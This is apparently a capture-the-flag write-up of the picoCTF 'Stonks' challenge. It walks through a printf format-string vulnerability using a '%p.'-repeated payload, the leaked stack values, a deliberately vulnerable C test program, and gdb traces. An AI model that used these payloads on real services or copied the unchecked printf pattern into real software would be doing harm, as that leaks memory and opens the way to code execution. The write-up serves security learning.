# Problem Definition

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`

# Solution

When we examine the program with a code editor we see that it's using the unsafe version of `printf` when getting the users' authorization token.

With the unsafe version of `printf` we can then dump content of the binary and execute code. Also, important to know for this are calling conventions. When first looking at the problem we noticed that the server was dumping _some_ data from the program but not which data. 

Consider our experimental setup from below:

`$ ./vuln < <(python3 -c "print(1);print('%p.' * 20)")` 

Which dumped us the following values from the program.

```sh
0x1.0x1.0x7f3008bc6190.0x55744ead10d5.0x7f3008ca0a80.0x7ffdc1c45b20.0x55744f6d52a0.
0x7b4654436f636970.0x5f737469625f3631.0x5f64343374736e69.0x3636325f385f666f.
0x7d3032633438.0x7f3008ca0260.0x55744ead3080.0x7f3008c9d5e0.0x7f3008cf0020.
0x7f3008b4fe79.0x7f3008ca1760.0x7f3008b50283.0x14.
```


While we know that some of the values are ascii characters we could not find indicators as to why the first to variables were `1`s. The solution was that under `64 bit` Linux the calling convention for syscalls takes arguments from the registers first, unlike with `32 bit` Linux. When compiling the binary under `32 bit` with the flag `-m32` in  `gcc` we see that we get a different result:

```sh
0x567bb3d0.0x565caff4.0x565c84ae.0xf7f76da0.0x7d4.0xf7f76de7.0x6f636970.0x7b465443.
0x625f3631.0x5f737469.0x74736e69.0x5f643433.0x385f666f.0x3636325f.0x32633438.
0xff007d30.0xf7fcac18.0xf7f8e800.0x1.0x1.
```

## Verification of our Hypotheses

To verify this hypotheses we constructed a smaller binary from this source:

```C
#include<stdio.h>
#include <string.h>

int main()
{
    char str[15];
    char *secret="You don't get to see this";
    puts("I will repeat whatever you say");
    scanf("%s",str);
    strcat(str, "\n");
    printf(str);
    return 0;
}
```

Verification with `gdb` indicated that it was indeed the case that `printf` took variables for the `32 bit` version from the stack first instead of using the registers like in the `64 bit` version. We used the format string `%p.%p.%p.%p.%p.%p.` and got `0xffffcd3d.0xf7da8a2f.0x565561d4.0xf7fc14a0.0xf7fd98cb.0xf7da8a2f.` as an answer. This is verified by taking a look at the stack from `gdb` at the time when `printf` is called. Since `printf` now takes all arguments from the stack we also see that we leak pointers that lie behind this.

```C
[----------------------------------registers-----------------------------------]
EAX: 0xffffcd3d ("%p.%p.%p.%p.%p.%p.\n")
EBX: 0x56558ff4 --> 0x3ef0
ECX: 0x330d ('\r3')
EDX: 0x12
ESI: 0x56558eec ("`aUV\001")
EDI: 0xf7ffcb80 --> 0x0
EBP: 0xffffcd58 --> 0x0
ESP: 0xffffcd20 --> 0xffffcd3d ("%p.%p.%p.%p.%p.%p.\n")
EIP: 0x5655622d (<main+112>:    call   0x56556040 <printf@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556226 <main+105>:       sub    esp,0xc
   0x56556229 <main+108>:       lea    eax,[ebp-0x1b]
   0x5655622c <main+111>:       push   eax
=> 0x5655622d <main+112>:       call   0x56556040 <printf@plt>
   0x56556232 <main+117>:       add    esp,0x10
   0x56556235 <main+120>:       mov    eax,0x0
   0x5655623a <main+125>:       lea    esp,[ebp-0x8]
   0x5655623d <main+128>:       pop    ecx
Guessed arguments:
arg[0]: 0xffffcd3d ("%p.%p.%p.%p.%p.%p.\n")
[------------------------------------stack-------------------------------------]
0000| 0xffffcd20 --> 0xffffcd3d ("%p.%p.%p.%p.%p.%p.\n")
0004| 0xffffcd24 --> 0xffffcd3d ("%p.%p.%p.%p.%p.%p.\n")
0008| 0xffffcd28 --> 0xf7da8a2f ("_dl_audit_preinit")
0012| 0xffffcd2c --> 0x565561d4 (<main+23>:     add    ebx,0x2e20)
0016| 0xffffcd30 --> 0xf7fc14a0 --> 0xf7d8c000 --> 0x464c457f
0020| 0xffffcd34 --> 0xf7fd98cb (mov    edi,eax)
0024| 0xffffcd38 --> 0xf7da8a2f ("_dl_audit_preinit")
0028| 0xffffcd3c --> 0x2e7025a0
[------------------------------------------------------------------------------]
```